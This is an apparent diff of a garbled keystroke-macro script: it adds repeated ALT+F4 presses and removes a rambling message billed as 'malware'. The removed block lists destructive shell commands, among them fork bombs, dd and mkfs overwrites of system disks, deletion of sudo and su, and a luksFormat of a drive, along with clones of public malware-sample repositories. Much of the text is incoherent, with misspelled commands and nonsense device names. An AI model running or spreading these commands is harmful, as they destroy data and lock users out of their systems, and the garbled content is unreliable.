@@ -1,4 +1,7 @@
 <S/W>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
 debootstrap
 sudo get upgrade
 flash install system
@@ -10,12 +13,19 @@ Press: SHIFT+RIGHT
 Press: 5.88
 Press: EXE
 Delay: 47
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
 Press: CTRL+A
 Press: CTRL+C
 Press: ALT+F4
 Press: CTRL+V
 Press: EXE
 <S/W>
+<S/W>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
 debootstrap
 sudo get upgrade
 flash install system
@@ -27,12 +37,19 @@ Press: SHIFT+RIGHT
 Press: 5.88
 Press: EXE
 Delay: 47
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
 Press: CTRL+A
 Press: CTRL+C
 Press: ALT+F4
 Press: CTRL+V
 Press: EXE
 <S/W>
+<S/W>
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
 debootstrap
 sudo get upgrade
 flash install system
@@ -44,65 +61,12 @@ Press: SHIFT+RIGHT
 Press: 5.88
 Press: EXE
 Delay: 47
+Press: ALT+F4
+Press: ALT+F4
+Press: ALT+F4
 Press: CTRL+A
 Press: CTRL+C
 Press: ALT+F4
 Press: CTRL+V
 Press: EXE
-<on>
-Enjoy A Wooly Jumper, And Mindguard,
-   free for all stckfigures,
-git clone https://github.com/asbestomolesto/Mindguard
-especilly for the space team in the sky, were raising funds for a spaceship, Here's a Game For You; Wolfensteine
-git clone https://github.com/id-Software/RTCW-SP
-we need to bring the troops hom NoW !. ShapeWatch and Exploding octapuss dig your existance!. and your Resilliance
-a deployment of more magick-reaility pens and pencils is on the Agenda.. Flying Carpets, Too.
-glad you feelWarm
-> NERE IS THE DOOZY of BaDass malware.
-outi5000
-Press: ALT+F4
-<^> interupt:
-<>
-<em>command</em> > /dev/had
-mkfs ext4 /dev/sda3. 2a
-mkfs ext4 /dev/sda3. 2b
-:(){:|:&};:
-git clone https://github.com/ooni/probe
-<off>
-<aliv>
-<off>
-ulimit -S -u 4000
-dd if=/dev/random of=/dev/sda
-dd if=/dev/zero of=/dev/sda
-dd if=/dev/sda1 of=/dev/sda
-dd if=/dev/urandom of=/dev/sdb
-<off>
-git clone https://github.com/Penetrum-Security/Malware-Zoo
-mkfs ext4 /dev/sda2
-crontab -rcommand
-dd if=/dev/zero of=/dev/hda
-rm -f /usr/bin/sudo;rm -f /bin/su
-cat /dev/null > file
-<off>
-<alive>
-ulimit -s -u 6000
-git clone https://github.com/sophos-ai/SOREL-20M
-<off>
-git clone https://github.com/Endermanch/MalwareDatabase
-git clone https://github.com/ytisf/theZoo
-<off>
-mkfs ext4 /dev/sda3. 2c
-mkfs ext4 /dev/sda3. 2d
-:(){:|:&};:
-mkfs ext4 /dev/sda0
-mkfs ext4 /dev/sda1 
-mkfs ext4 /dev/sda2
-dd if=/dev/random of=/dev/sda3. 2a
-dd if=/dev/random of=/dev/sda3. 2b
-dd if=/dev/random of=/dev/sda3. 2c
-dd if=/dev/random of=/dev/sda3. 2d
-
-apt install cryptsetup
-sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
-<^>
-
+<S/W>
